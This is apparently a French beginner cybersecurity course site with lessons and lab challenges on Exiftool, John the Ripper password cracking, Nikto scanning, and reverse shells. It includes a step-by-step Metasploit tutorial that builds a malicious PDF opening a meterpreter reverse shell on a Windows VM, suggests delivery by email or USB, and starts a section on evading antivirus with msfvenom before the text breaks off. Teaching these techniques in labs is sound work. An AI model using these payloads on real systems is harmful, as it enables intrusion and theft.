<!DOCTYPE html>
<html class="writer-html5" lang="fr" >
<head>
  <meta charset="utf-8" /><meta name="generator" content="Docutils 0.17.1: http://docutils.sourceforge.net/" />

  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>Exiftool &mdash; Documentation cybersec-du-dimanche 0.0</title>
      <link rel="stylesheet" href="_static/pygments.css" type="text/css" />
      <link rel="stylesheet" href="_static/css/theme.css" type="text/css" />
  <!--[if lt IE 9]>
    <script src="_static/js/html5shiv.min.js"></script>
  <![endif]-->
  
        <script data-url_root="./" id="documentation_options" src="_static/documentation_options.js"></script>
        <script src="_static/jquery.js"></script>
        <script src="_static/underscore.js"></script>
        <script src="_static/_sphinx_javascript_frameworks_compat.js"></script>
        <script src="_static/doctools.js"></script>
        <script src="_static/translations.js"></script>
    <script src="_static/js/theme.js"></script>
    <link rel="index" title="Index" href="genindex.html" />
    <link rel="search" title="Recherche" href="search.html" /> 
</head>

<body class="wy-body-for-nav"> 
  <div class="wy-grid-for-nav">
    <nav data-toggle="wy-nav-shift" class="wy-nav-side">
      <div class="wy-side-scroll">
        <div class="wy-side-nav-search" >
            <a href="#" class="icon icon-home"> cybersec-du-dimanche
          </a>
<div role="search">
  <form id="rtd-search-form" class="wy-form" action="search.html" method="get">
    <input type="text" name="q" placeholder="Rechercher docs" />
    <input type="hidden" name="check_keywords" value="yes" />
    <input type="hidden" name="area" value="default" />
  </form>
</div>
        </div><div class="wy-menu wy-menu-vertical" data-spy="affix" role="navigation" aria-label="Navigation menu">
              <!-- Local TOC -->
              <div class="local-toc"><ul>
<li><a class="reference internal" href="#">Exiftool</a><ul>
<li><a class="reference internal" href="#cours">Cours</a><ul>
<li><a class="reference internal" href="#qu-est-ce-qu-exiftool">Qu’est ce qu’Exiftool ?</a></li>
<li><a class="reference internal" href="#qu-est-ce-les-metadonnees">Qu’est ce les Métadonnées ?</a></li>
<li><a class="reference internal" href="#comment-visionner-les-metadonnees-d-une-image">Comment visionner les Métadonnées d’une image ?</a></li>
<li><a class="reference internal" href="#pourquoi-les-metadonnees-sont-importantes-dans-le-monde-de-la-cybersecurite">Pourquoi les Métadonnées sont importantes dans le monde de la cybersécurité ?</a></li>
<li><a class="reference internal" href="#details-compatibilite">Détails compatibilité</a></li>
</ul>
</li>
<li><a class="reference internal" href="#challenge">Challenge</a><ul>
<li><a class="reference internal" href="#trouver-le-pseudo-de-l-artiste-de-l-image-suivante">Trouver le pseudo de l’artiste de l’image suivante :</a></li>
<li><a class="reference internal" href="#source-image">Source image :</a></li>
</ul>
</li>
</ul>
</li>
<li><a class="reference internal" href="#john-the-ripper">John the Ripper</a><ul>
<li><a class="reference internal" href="#id1">Cours</a><ul>
<li><a class="reference internal" href="#a-quoi-sert-john">A quoi sert John ?</a></li>
<li><a class="reference internal" href="#comment-lancer-l-attaque-brute-force-avec-john">Comment lancer l’attaque brute force avec John ?</a></li>
<li><a class="reference internal" href="#entrainement-et-mise-en-situation-reelle">Entrainement et mise en situation réelle</a><ul>
<li><a class="reference internal" href="#que-devez-vous-faire">Que devez-vous faire ?</a></li>
<li><a class="reference internal" href="#objectifs">Objectifs</a><ul>
<li><a class="reference internal" href="#situation">Situation</a></li>
<li><a class="reference internal" href="#que-faire">Que faire ?</a></li>
</ul>
</li>
<li><a class="reference internal" href="#video-de-resolution">Vidéo de résolution</a></li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
<li><a class="reference internal" href="#nikto">Nikto</a><ul>
<li><a class="reference internal" href="#id2">Cours</a><ul>
<li><a class="reference internal" href="#quest-ce-que-nikto">Qu’est ce que Nikto ?</a></li>
<li><a class="reference internal" href="#que-peut-il-nous-donner-comme-informations">Que peut-il nous donner comme informations ?</a></li>
<li><a class="reference internal" href="#comment-telecharger-nikto">Comment télécharger Nikto ?</a></li>
<li><a class="reference internal" href="#comment-utiliser-nikto">Comment utiliser Nikto ?</a></li>
</ul>
</li>
<li><a class="reference internal" href="#id3">Challenge</a><ul>
<li><a class="reference internal" href="#objectif-du-challenge">Objectif du challenge :</a></li>
<li><a class="reference internal" href="#que-faut-il-faire">Que faut-il faire ?</a></li>
</ul>
</li>
</ul>
</li>
<li><a class="reference internal" href="#reverse-shell">Reverse Shell</a><ul>
<li><a class="reference internal" href="#id4">Cours</a><ul>
<li><a class="reference internal" href="#quest-ce-quun-reverse-shell">Qu’est ce qu’un reverse shell ?</a></li>
<li><a class="reference internal" href="#comment-cela-fonctionne-t-il">Comment cela fonctionne-t-il ?</a></li>
<li><a class="reference internal" href="#et-dans-la-pratique-comment-on-fait-metasploit">Et dans la pratique… Comment on fait ? (Metasploit)</a></li>
</ul>
</li>
<li><a class="reference internal" href="#tutoriel-prendre-le-controle-dune-machine-windows-avec-un-fichier-pdf">Tutoriel : Prendre le contrôle d’une machine windows avec un fichier pdf</a><ul>
<li><a class="reference internal" href="#etape-1-creer-et-recuperer-le-pdf-malicieux">Étape 1 : Créer et récupérer le pdf malicieux</a></li>
<li><a class="reference internal" href="#etape-2-activer-le-listener">ÉTAPE 2 : Activer le listener</a></li>
<li><a class="reference internal" href="#etape-3-envoyer-le-fichier">ÉTAPE 3 : Envoyer le fichier</a></li>
<li><a class="reference internal" href="#etape-4-ouvrir-le-fichier">ÉTAPE 4 : Ouvrir le fichier</a></li>
</ul>
</li>
</ul>
</li>
<li><a class="reference internal" href="#virus-encoders">Virus encoders</a><ul>
<li><a class="reference internal" href="#msfvenom-est-il-possible-de-tromper-l-antivirus">Msfvenom : est-il possible de tromper l’antivirus ?</a></li>
</ul>
</li>
</ul>
</div>
        </div>
      </div>
    </nav>

    <section data-toggle="wy-nav-shift" class="wy-nav-content-wrap"><nav class="wy-nav-top" aria-label="Mobile navigation menu" >
          <i data-toggle="wy-nav-top" class="fa fa-bars"></i>
          <a href="#">cybersec-du-dimanche</a>
      </nav>

      <div class="wy-nav-content">
        <div class="rst-content">
          <div role="navigation" aria-label="Page navigation">
  <ul class="wy-breadcrumbs">
      <li><a href="#" class="icon icon-home"></a> &raquo;</li>
      <li>Exiftool</li>
      <li class="wy-breadcrumbs-aside">
            <a href="_sources/index.md.txt" rel="nofollow"> Afficher la source de la page</a>
      </li>
  </ul>
  <hr/>
</div>
          <div role="main" class="document" itemscope="itemscope" itemtype="http://schema.org/Article">
           <div itemprop="articleBody">
             
  <section id="exiftool">
<h1>Exiftool<a class="headerlink" href="#exiftool" title="Lien permanent vers cette rubrique"></a></h1>
<section id="cours">
<h2>Cours<a class="headerlink" href="#cours" title="Lien permanent vers cette rubrique"></a></h2>
<section id="qu-est-ce-qu-exiftool">
<h3>Qu’est ce qu’Exiftool ?<a class="headerlink" href="#qu-est-ce-qu-exiftool" title="Lien permanent vers cette rubrique"></a></h3>
<p>Exiftool est un outil en ligne de commande pour lire, écrire et éditer les métadonnées de différents types de fichiers différents.</p>
</section>
<section id="qu-est-ce-les-metadonnees">
<h3>Qu’est ce les Métadonnées ?<a class="headerlink" href="#qu-est-ce-les-metadonnees" title="Lien permanent vers cette rubrique"></a></h3>
<p>Lorsque vous prenez une photo avec votre smartphone, vous pouvez la retrouver et la visioner dans votre gallerie d’images dès que vous voulez. Votre smartphone ne prend cependant pas uniquement une capture de l’instant. En effet, ce dernier capture la date et l’heure précise à laquelle vous appuyez sur le bouton pour prendre votre photo, ajoute à cela la taille de résolution de l’image, la position gps, et plein d’autres informations supplémentaires qui sont ajoutées à l’image. Toutes ces informations sont appelées les métadonnées.</p>
</section>
<section id="comment-visionner-les-metadonnees-d-une-image">
<h3>Comment visionner les Métadonnées d’une image ?<a class="headerlink" href="#comment-visionner-les-metadonnees-d-une-image" title="Lien permanent vers cette rubrique"></a></h3>
<p>Exiftool vous permet très facilement de lire ces métadonnées de vos photos :</p>
<div class="highlight-shell notranslate"><div class="highlight"><pre><span></span>    exiftool &lt;image.jpg&gt;
</pre></div>
</div>
</section>
<section id="pourquoi-les-metadonnees-sont-importantes-dans-le-monde-de-la-cybersecurite">
<h3>Pourquoi les Métadonnées sont importantes dans le monde de la cybersécurité ?<a class="headerlink" href="#pourquoi-les-metadonnees-sont-importantes-dans-le-monde-de-la-cybersecurite" title="Lien permanent vers cette rubrique"></a></h3>
<p>Lorsque vous envoyez une image à un proche, vous l’envoyez avec toutes ses Métadonnées. Si l’image d’origine est interceptée ou dérobée par une personne malveillante, cette dernière pourra lire les métadonnées de l’image. Ayant précisé juste avant que l’image pouvait contenir des coordonnées GPS exactes, vous pouvez imaginer ce qu’une personne malveillante peut faire. Le modèle d’appareil qui a pris la photo peut aussi être identifié, ce qui peut être utile dans la phase de reconnaissance pour une future exploitation de failles, en connaissant le modèle de l’appareil à infecter la tâche s’annonce tout de suite plus simple pour un attaquant.
Ainsi, même si l’image n’est pas compromettante en elle même, elle peut le devenir par ses métadonnées.</p>
</section>
<section id="details-compatibilite">
<h3>Détails compatibilité<a class="headerlink" href="#details-compatibilite" title="Lien permanent vers cette rubrique"></a></h3>
<p>Vous pouvez retrouver tous les types de fichiers compatibles avec exiftool sur le site officiel : <a class="reference external" href="https://exiftool.org/">exiftool.org</a></p>
</section>
</section>
<section id="challenge">
<h2>Challenge<a class="headerlink" href="#challenge" title="Lien permanent vers cette rubrique"></a></h2>
<section id="trouver-le-pseudo-de-l-artiste-de-l-image-suivante">
<h3>Trouver le pseudo de l’artiste de l’image suivante :<a class="headerlink" href="#trouver-le-pseudo-de-l-artiste-de-l-image-suivante" title="Lien permanent vers cette rubrique"></a></h3>
<p><img alt="image exif" src="_images/exifimg.jpg" /></p>
</section>
<section id="source-image">
<h3>Source image :<a class="headerlink" href="#source-image" title="Lien permanent vers cette rubrique"></a></h3>
<p>L’image a été trouvée sur le site :
<a class="reference external" href="https://en.freejpg.com.ar/free/info/100031658/milky-way-pine-forest-night-dawn">freepng.com</a>
puis les métadonnées ont été modifiées pour ce challenge.</p>
</section>
</section>
</section>
<section id="john-the-ripper">
<h1>John the Ripper<a class="headerlink" href="#john-the-ripper" title="Lien permanent vers cette rubrique"></a></h1>
<p><img alt="image john" src="_images/john-logo.png" /></p>
<section id="id1">
<h2>Cours<a class="headerlink" href="#id1" title="Lien permanent vers cette rubrique"></a></h2>
<section id="a-quoi-sert-john">
<h3>A quoi sert John ?<a class="headerlink" href="#a-quoi-sert-john" title="Lien permanent vers cette rubrique"></a></h3>
<p>L’outil John va nous être très utile pour le cracking de mot de passe. En effet, si un attaquant parvient d’une manière ou d’une autre à récupérer une base de donnée d’un site contenant les identifiants et mots de passe des utilisateurs, la grande majorité du temps, ce dernier ne pourra pas lire le mot de passe directement. En effet, une sécurité a été ajoutée pour stocker les mots de passe au cas où ce genre de situation arriverait.</p>
<p>Sans entrer dans les détails, les mots de passe sont stockés sous forme de hash, ce qui correspond à passer le mot de passe de l’utilisateur dans une fonction complexe à sens unique. Ce qui signifie que même avec un hash, il est impossible de récupérer directement le mot de passe en clair. Lors de la connexion le hash entré et le hash stocké sont comparés pour voir si ce sont les mêmes.</p>
<p>Cependant il n’est pas impossible de trouver un mot de passe à partir du hash.</p>
<p>John nous permet d’effectuer une attaque brute force simple, ou par dictionnaire lorsque nous avons un ou plusieurs hashes à disposition.</p>
</section>
<section id="comment-lancer-l-attaque-brute-force-avec-john">
<h3>Comment lancer l’attaque brute force avec John ?<a class="headerlink" href="#comment-lancer-l-attaque-brute-force-avec-john" title="Lien permanent vers cette rubrique"></a></h3>
<p>Imaginons un fichier mdp.hashes contenant le hash d’une session. Le fichier pourrait contenir une ligne comme suit :</p>
<div class="highlight-default notranslate"><div class="highlight"><pre><span></span>jeremy:$1$XT.ZwPx4$LpAfbyGhDRZ3QSxdCzUqD/:19123:0:99999:7:::
</pre></div>
</div>
<p>où</p>
<div class="highlight-default notranslate"><div class="highlight"><pre><span></span>$1$XT.ZwPx4$LpAfbyGhDRZ3QSxdCzUqD/
</pre></div>
</div>
<p>correspond au hash du mot de passe de connexion.</p>
<p>Ainsi john pourra nous être utile à casser le mot de passe par une attaque par dictionnaire en tapant la commande suivante :</p>
<div class="highlight-shell notranslate"><div class="highlight"><pre><span></span>john -w<span class="o">=</span>liste.txt mdp.hashes
</pre></div>
</div>
<p>Ainsi cette ligne demande à john de calculer tous les hash des mots contenus dans liste.txt et de le comparer au hash de la session. Si les deux hashes sont les mêmes, alors le mot de passe est trouvé et John s’arrête.</p>
</section>
<section id="entrainement-et-mise-en-situation-reelle">
<h3>Entrainement et mise en situation réelle<a class="headerlink" href="#entrainement-et-mise-en-situation-reelle" title="Lien permanent vers cette rubrique"></a></h3>
<p>Pour voir si vous avez bien compris le cours, je vous propose de vous entrainer sur un docker que j’ai créé spécialement pour cela.</p>
<section id="que-devez-vous-faire">
<h4>Que devez-vous faire ?<a class="headerlink" href="#que-devez-vous-faire" title="Lien permanent vers cette rubrique"></a></h4>
<p>Il vous faut docker installé (il existe tout un tas de tutoriels qui vous expliquerons comment le télécharger)
quand docker et docker-compose sont installés sur votre machine, nous pouvons passer à la suite :</p>
<p>Il vous faut télécharger le fichier <a class="reference download internal" download="" href="_downloads/679bf297646da81b0048d270b978de29/docker-compose.yml"><span class="xref download myst">docker-compose.yml</span></a></p>
<p>Ensuite, il vous restera quelques commandes à connaître :</p>
<div class="highlight-shell notranslate"><div class="highlight"><pre><span></span>    docker-compose up -d
    docker <span class="nb">exec</span> -it martin /bin/bash
    docker <span class="nb">exec</span> -it john /bin/bash
</pre></div>
</div>
<p>La première commande vous permet de créer les deux machines dont vous aurez besoin. La machine de martin correspond à la machine victime et la machine john à celle de l’attaque qui possède l’outil john installé dessus.</p>
</section>
<section id="objectifs">
<h4>Objectifs<a class="headerlink" href="#objectifs" title="Lien permanent vers cette rubrique"></a></h4>
<section id="situation">
<h5>Situation<a class="headerlink" href="#situation" title="Lien permanent vers cette rubrique"></a></h5>
<p>Martin veut mettre sa machine à jour avec <code class="docutils literal notranslate"><span class="pre">apt-get</span> <span class="pre">update</span></code>, mais pour cela il doit être root sur sa machine. Malheureusement il ne connait pas son mot de passe administrateur car c’est son ami Jeremy qui a configuré sa machine ! Ce dernier ne se souvient plus du tout du mot de passe non plus :( Arriverez-vous à trouver le mot de passe administrateur de cette machine pour la mettre à jour ?</p>
</section>
<section id="que-faire">
<h5>Que faire ?<a class="headerlink" href="#que-faire" title="Lien permanent vers cette rubrique"></a></h5>
<ul class="simple">
<li><p>Récupérer les mots de passe hachés de session</p></li>
<li><p>Cracker le hash avec John d’une session susceptible d’avoir les accès root</p></li>
<li><p>Connectez vous avec la session dont vous avez trouvé le mot de passe</p></li>
<li><p>Tapez la commande <code class="docutils literal notranslate"><span class="pre">apt-get</span> <span class="pre">update</span></code></p></li>
</ul>
<p>Si la machine est à jour vous avez accompli votre mission. Félicitations</p>
</section>
</section>
<section id="video-de-resolution">
<h4>Vidéo de résolution<a class="headerlink" href="#video-de-resolution" title="Lien permanent vers cette rubrique"></a></h4>
<p><a class="reference external" href="https://youtu.be/5X0gQ5gLaO0">vidéo youtube</a></p>
</section>
</section>
</section>
</section>
<section id="nikto">
<h1>Nikto<a class="headerlink" href="#nikto" title="Lien permanent vers cette rubrique"></a></h1>
<section id="id2">
<h2>Cours<a class="headerlink" href="#id2" title="Lien permanent vers cette rubrique"></a></h2>
<section id="quest-ce-que-nikto">
<h3>Qu’est ce que Nikto ?<a class="headerlink" href="#quest-ce-que-nikto" title="Lien permanent vers cette rubrique"></a></h3>
<p>Nikto est une application open source créée en 2001 qui permet de scanner des serveurs web. Il permettra de donner des informations sur de potentielle vulnérabilités par exemple.</p>
</section>
<section id="que-peut-il-nous-donner-comme-informations">
<h3>Que peut-il nous donner comme informations ?<a class="headerlink" href="#que-peut-il-nous-donner-comme-informations" title="Lien permanent vers cette rubrique"></a></h3>
<p>Nikto est capable de :</p>
<ul class="simple">
<li><p>trouver des injections SQL,XSS et autres types de vulnérabilité.</p></li>
<li><p>Deviner des sous-domaines</p></li>
<li><p>Sauvegarder des rapport dans des fichier HTML,CSV ou XML</p></li>
<li><p>Identifier les logiciels installés</p></li>
<li><p>Exporter vers Metasploit</p></li>
<li><p>Deviner des identifiants/mot de passe faciles à trouver</p></li>
</ul>
</section>
<section id="comment-telecharger-nikto">
<h3>Comment télécharger Nikto ?<a class="headerlink" href="#comment-telecharger-nikto" title="Lien permanent vers cette rubrique"></a></h3>
<p>Comme beaucoup d’outils de pentesting, Nikto est présent par défaut sur Kali Linux.
Si vous avez une autre distribution Linux (debian) vous pourrez l’installer par la commande <code class="docutils literal notranslate"><span class="pre">apt-get</span> <span class="pre">install</span> <span class="pre">nikto</span></code>. Sinon, vous pouvez vous rendre sur Github : https://github.com/sullo/nikto</p>
</section>
<section id="comment-utiliser-nikto">
<h3>Comment utiliser Nikto ?<a class="headerlink" href="#comment-utiliser-nikto" title="Lien permanent vers cette rubrique"></a></h3>
<p>Pour voir toutes les possibilités et commandes de nikto, la première commande à taper est :</p>
<p><code class="docutils literal notranslate"><span class="pre">nikto</span> <span class="pre">-Help</span></code>.</p>
<p>Vous verrez tout un tas d’options expliquées par la suite. La plus simple et la plus utilisée sera la commande :
<code class="docutils literal notranslate"><span class="pre">nikto</span> <span class="pre">-h</span> <span class="pre">&lt;target&gt;</span></code> en remplaçant la target par une adresse ip ou un nom de domaine.</p>
<p>D’autres options complémentaires pourront s’ajouter à cette commande telles que : <code class="docutils literal notranslate"><span class="pre">-id</span></code> qui servira à renseigner une combinaison <code class="docutils literal notranslate"><span class="pre">identifiant:motdepasse</span></code> pour se connecter sur la cible, ou encore   <code class="docutils literal notranslate"><span class="pre">-mutate</span></code> pour découvrir de nouveaux fichiers ou dossiers cachés.</p>
<p>Si l’on veut scanner un domaine en https, il faudra ajouter le tag <code class="docutils literal notranslate"><span class="pre">-ssl</span></code> pour scanner le port 443.</p>
<p>Il est aussi possible de scanner plusieurs adresses IP en même temps. Par exemple en les mettant dans un fichier texte et en tapant la commande : <code class="docutils literal notranslate"><span class="pre">nikto</span> <span class="pre">-h</span> <span class="pre">adresses.txt</span></code></p>
</section>
</section>
<section id="id3">
<h2>Challenge<a class="headerlink" href="#id3" title="Lien permanent vers cette rubrique"></a></h2>
<section id="objectif-du-challenge">
<h3>Objectif du challenge :<a class="headerlink" href="#objectif-du-challenge" title="Lien permanent vers cette rubrique"></a></h3>
<p>trouver le numéro OSVDB de la potentielle vulnérabilité de la machine docker déployée.</p>
</section>
<section id="que-faut-il-faire">
<h3>Que faut-il faire ?<a class="headerlink" href="#que-faut-il-faire" title="Lien permanent vers cette rubrique"></a></h3>
<p>Récupérer les machines :</p>
<ul class="simple">
<li><p>Télécharger le fichier <a class="reference download internal" download="" href="_downloads/6aa47e24b82305bd47a8f84e88658377/docker-compose.yml"><span class="xref download myst">docker-compose.yml</span></a></p></li>
<li><p>Déployer et utiliser les machines :</p></li>
</ul>
<div class="highlight-console notranslate"><div class="highlight"><pre><span></span><span class="go">docker-compose up -d</span>
<span class="go">docker exec -it nikto_machine /bin/bash</span>
</pre></div>
</div>
<ul class="simple">
<li><p>Analyser la machine avec nikto et lire le numéro OSVDB de la vulnérabilité trouvée.</p></li>
</ul>
</section>
</section>
</section>
<section id="reverse-shell">
<h1>Reverse Shell<a class="headerlink" href="#reverse-shell" title="Lien permanent vers cette rubrique"></a></h1>
<section id="id4">
<h2>Cours<a class="headerlink" href="#id4" title="Lien permanent vers cette rubrique"></a></h2>
<p>Avant de parler de reverse shell, il faudrait tout d’abord rappeler ce qu’est un shell.
Un shell est une couche logicielle qui fournit l’interface utilisateur du système d’exploitation. ( <a class="reference external" href="https://fr.wikipedia.org/wiki/Interface_syst%C3%A8me">wikipedia</a> )
Différents shells existent : CMD, sh, bash, Powershell,…</p>
<p>Une autre notion avant de comprendre ce qu’est un reverse shell est qu’est-ce qu’un port ?
Un port informatique du point de vue logiciel est un système permettant aux ordinateurs de recevoir ou d’émettre des informations. ( <a class="reference external" href="https://fr.wikipedia.org/wiki/Port_informatique#:~:text=En%20informatique%2C%20port%20informatique%20ou,qui%20d%C3%A9signe%20un%20portage%20informatique.">wikipedia</a> )</p>
<section id="quest-ce-quun-reverse-shell">
<h3>Qu’est ce qu’un reverse shell ?<a class="headerlink" href="#quest-ce-quun-reverse-shell" title="Lien permanent vers cette rubrique"></a></h3>
<p>Pour dire ça simplement, c’est lorsqu’un ordinateur se connecte à un autre ordinateur mais que l’ordinateur initiateur transmet son shell à la destination. Ainsi, ce type d’attaque donne à l’attaquant un shell interactif sur une machine.</p>
</section>
<section id="comment-cela-fonctionne-t-il">
<h3>Comment cela fonctionne-t-il ?<a class="headerlink" href="#comment-cela-fonctionne-t-il" title="Lien permanent vers cette rubrique"></a></h3>
<p>Vous n’êtes pas sans savoir que votre routeur vous protège d’un grand nombre de menaces qui pourraient venir de l’extérieur grâce à un firewall. En effet ce dernier n’accepte que des requêtes vers le port 80 et 443 de l’extérieur pour le http et le https. Toutes les autres sont bloquées. Cependant, toutes les requêtes et connexions sortantes sont autorisées sur n’importe quel port car l’ordinateur du réseau est considéré comme une machine de confiance. Cela permet à un attaquant de passer outre le firewall mit en place par le routeur.</p>
<p>L’attaque commence avec une machine qui écoute sur un port (il s’agit de la machine de l’attaquant). Ensuite, la machine victime exécutera une commande qui la connectera à la machine attaquante et lui transmettra sa session.</p>
<p>Peut-être vous demanderez vous pourquoi la machine victime voudrait à un moment donné exécuter cette commande… Cela peut être utile dans le domaine professionnel ou personnel si vous avez un ordinateur distant que vous voulez utiliser pour telle ou telle raison depuis un autre ordinateur, cela est possible. Dans le cas d’une attaque la commande pourra s’exécuter suite au téléchargement d’un fichier exécutable ou d’un fichier pdf ouvert avec un visionneur de pdf qui n’a pas été mis à jour.</p>
</section>
<section id="et-dans-la-pratique-comment-on-fait-metasploit">
<h3>Et dans la pratique… Comment on fait ? (Metasploit)<a class="headerlink" href="#et-dans-la-pratique-comment-on-fait-metasploit" title="Lien permanent vers cette rubrique"></a></h3>
<p>Pour commencer, un attaquant va créer ou télécharger un payload qu’il pourra envoyer à sa victime. Un payload est un fichier qui va exécuter du code malveillant, et dans notre cas ouvrir une connexion entre l’attaquant et la victime.</p>
<p>Le module <code class="docutils literal notranslate"><span class="pre">exploit/windows/fileformat/adobe_pdf_embedded_exe</span></code> dans Metasploit nous permet de créer un payload pdf contenant un fichier exe dans son en-tête qui sera exécuté à l’ouverture du pdf. Il faudra configurer LHOST et LPORT comme l’adresse et le port de l’attaquant ou d’un serveur auquel les deux ordinateurs peuvent se connecter.</p>
<p>Une fois le payload préparé, il suffit de l’envoyer à la victime. Toutes les techniques sont possibles (email, lien, clé usb,…)</p>
<p>Désormais, il faut mettre en place le “listener” pour écouter et attendre une connexion sur le port spécifié dans LPORT lors de la création du payload.
Le module <code class="docutils literal notranslate"><span class="pre">exploit/multi/handler</span></code> fonctionne très bien. Il faut ensuite préparer l’écoute en faisant : <code class="docutils literal notranslate"><span class="pre">set</span> <span class="pre">payload</span> <span class="pre">windows/meterpreter/reverse_tcp</span></code> et en renseignant le LHOST et LPORT du payload pour dire à metasploit que nous avons un payload utilisant le protocole tcp et que nous allons ouvrir un meterpreter s’il y a une connexion d’une machine victime. Le meterpreter est un shell interactif qui permet à l’attaquant de faire un grand nombre de choses, upload/download de fichiers, stream de webcam, voir l’écran, créer des fichiers, ouvrir des pages web,…
Il faudra ensuite taper la commande exploit pour que la machine se mette sur écoute.</p>
<p>A partir de là, il suffit d’attendre que la victime ouvre le fichier malveillant qu’elle a téléchargé et l’attaquant aura un accès total à la machine.</p>
</section>
</section>
<section id="tutoriel-prendre-le-controle-dune-machine-windows-avec-un-fichier-pdf">
<h2>Tutoriel : Prendre le contrôle d’une machine windows avec un fichier pdf<a class="headerlink" href="#tutoriel-prendre-le-controle-dune-machine-windows-avec-un-fichier-pdf" title="Lien permanent vers cette rubrique"></a></h2>
<p>Avant de commencer ce tutoriel, je vous conseillerai d’aller voir le cours sur le reverse shell pour bien comprendre les différentes étapes. Si vous avez lu le cours, je vous conseille maintenant d’aller commencer à télécharger la machine virtuelle que vous pourrez importer dans virtualbox en cliquant sur : <a class="reference external" href="https://mega.nz/file/YbEHwDJa#ky-4v_EFZCSYkLJLwulOvQXYNAbfivyp73gFinxZoDk">télécharger la Machine Virtuelle</a>{:target= »_blank »}</p>
<section id="etape-1-creer-et-recuperer-le-pdf-malicieux">
<h3>Étape 1 : Créer et récupérer le pdf malicieux<a class="headerlink" href="#etape-1-creer-et-recuperer-le-pdf-malicieux" title="Lien permanent vers cette rubrique"></a></h3>
<p>Métasploit propose un grand nombre de payloads divers et variés. En tapant les bonnes recherches, il sera possible de trouver facilement celui qui nous intéresse.
Tapez la commande <code class="docutils literal notranslate"><span class="pre">msfconsole</span></code> pour démarrer métasploit.
Ensuite il faut chercher le payload.
Tapez <code class="docutils literal notranslate"><span class="pre">search</span> <span class="pre">windows</span> <span class="pre">fileformat</span> <span class="pre">pdf</span></code>. Vous aurez un résultat comme ci dessous :</p>
<p><img alt="image search" src="_images/search_msfconsole.png" /></p>
<p>Plusieurs modules répondent à notre recherche, mais peu d’entre eux sont classés comme excellents. Nous allons donc prendre le numéro 6.
Pour l’utiliser tapez <code class="docutils literal notranslate"><span class="pre">use</span> <span class="pre">exploit/windows/fileformat/adobe_pdf_embedded_exe</span></code>
Nous allons vouloir configurer un payload qui nous fera une connexion vers notre machine et qui ouvrira une session meterpreter.
Ainsi, tapons la commande : <code class="docutils literal notranslate"><span class="pre">set</span> <span class="pre">payload</span> <span class="pre">windows/meterpreter/reverse_tcp</span></code></p>
<p>Pour voir les options actuelles du payload, tapez : <code class="docutils literal notranslate"><span class="pre">show</span> <span class="pre">options</span></code>
<img alt="image options" src="_images/show_options.png" /></p>
<p>Vous devriez avoir quelque chose comme cela, peut être qu’une adresse par défaut ou qu’un port par défaut à été renseigné pour LHOST et LPORT.
Nous allons configurer ce payload. Il faut commencer par renseigner les valeurs de LHOST et LPORT.
Pour cela tapez <code class="docutils literal notranslate"><span class="pre">set</span> <span class="pre">LHOST</span> <span class="pre">x.x.x.x</span></code> en remplaçant les x par les valeurs de l’adresse ip de votre machine. Puis tapez <code class="docutils literal notranslate"><span class="pre">set</span> <span class="pre">LPORT</span> <span class="pre">xxx</span></code> en remplaçant xxx par le port de votre choix (par exemple, <code class="docutils literal notranslate"><span class="pre">set</span> <span class="pre">LPORT</span> <span class="pre">4444</span></code>).
vous pouvez refaire un show options, vous devriez voir que les options ont été prises en compte.
Vous pouvez ensuite modifier le nom de votre fichier pdf en tapant <code class="docutils literal notranslate"><span class="pre">set</span> <span class="pre">FILENAME</span> <span class="pre">xxxx.pdf</span></code> en remplaçant xxxx par le nom que vous voulez donner.</p>
<p>Quand tout est prêt, tapez exploit. Vous verrez ensuite que votre fichier a été créé et la console vous indique à la dernière ligne le chemin d’accès à ce fichier.</p>
</section>
<section id="etape-2-activer-le-listener">
<h3>ÉTAPE 2 : Activer le listener<a class="headerlink" href="#etape-2-activer-le-listener" title="Lien permanent vers cette rubrique"></a></h3>
<p>Pour activer le listener, il vous faudra taper la commande <code class="docutils literal notranslate"><span class="pre">use</span> <span class="pre">exploit/multi/handler</span></code>
puis <code class="docutils literal notranslate"><span class="pre">set</span> <span class="pre">payload</span> <span class="pre">windows/meterpreter/reverse_tcp</span></code>
De même que précédemment, il vous faut renseigner LHOST et LPORT. Quand cela est fait, tapez exploit.</p>
</section>
<section id="etape-3-envoyer-le-fichier">
<h3>ÉTAPE 3 : Envoyer le fichier<a class="headerlink" href="#etape-3-envoyer-le-fichier" title="Lien permanent vers cette rubrique"></a></h3>
<p>Vous pouvez envoyer le fichier de toutes les manières possibles : par usb, par mail, en le mettant en ligne en ayant démarré un serveur apache,… et tout autre technique imaginable.</p>
</section>
<section id="etape-4-ouvrir-le-fichier">
<h3>ÉTAPE 4 : Ouvrir le fichier<a class="headerlink" href="#etape-4-ouvrir-le-fichier" title="Lien permanent vers cette rubrique"></a></h3>
<p>Le fichier est bien téléchargé sur la machine virtuelle.
Avant de l’ouvrir, vérifiez bien que le listener est lancé. Vous devez voir cela :</p>
<p><img alt="image listener" src="_images/listener.png" /></p>
<p>avec votre adresse et votre port que vous avez renseigné.</p>
<p>Si tout est prêt, ouvrez le pdf avec adobe reader 8 !</p>
<p><img alt="image enregistrer" src="_images/enregistrer-template.png" /></p>
<p>Enregistrez template.pdf s’il vous le demande.</p>
<p><img alt="image open" src="_images/openpdf.png" /></p>
<p>Cliquez sur open.</p>
<p>Retournez voir votre listener… Une fenêtre meterpreter s’est lancée, une connexion a été faite entre votre machine et celle de la victime. Tapez <code class="docutils literal notranslate"><span class="pre">help</span></code> pour voir tout ce qu’il vous est possible de faire. Amusez-vous bien ! Félicitations !</p>
</section>
</section>
</section>
<section id="virus-encoders">
<h1>Virus encoders<a class="headerlink" href="#virus-encoders" title="Lien permanent vers cette rubrique"></a></h1>
<section id="msfvenom-est-il-possible-de-tromper-l-antivirus">
<h2>Msfvenom : est-il possible de tromper l’antivirus ?<a class="headerlink" href="#msfvenom-est-il-possible-de-tromper-l-antivirus" title="Lien permanent vers cette rubrique"></a></h2>
<p>msfvenom est un outil de création de payloads (charge utile en français).</p>
<p>Cet outil propose un grand nombre de personnalisations (encodage, chiffrement, taille maximale du fichier…,).
En créant un payload, l’objectif principal d’un attaquant sera de prendre le contrôle d’une machine victime à
distance, notamment à l’aide d’un reverse shell.
Cependant, bon nombre d’anti-virus arrivent désormais à détecter et à bloquer le fonctionnement de ce genre de
fichiers lorsqu’ils sont téléchargés.</p>
<p>Ainsi les pirates ont mis en place des techniques afin de rendre de moins en moins détectables ces fichiers.
Pour commencer, ils ont pensé à chiffrer le payload avec une clef de chiffrement
et créer un exécutable qui le déchiffre et l’exécuter ensuite sur la machine victime. Malheureusement, maintenant
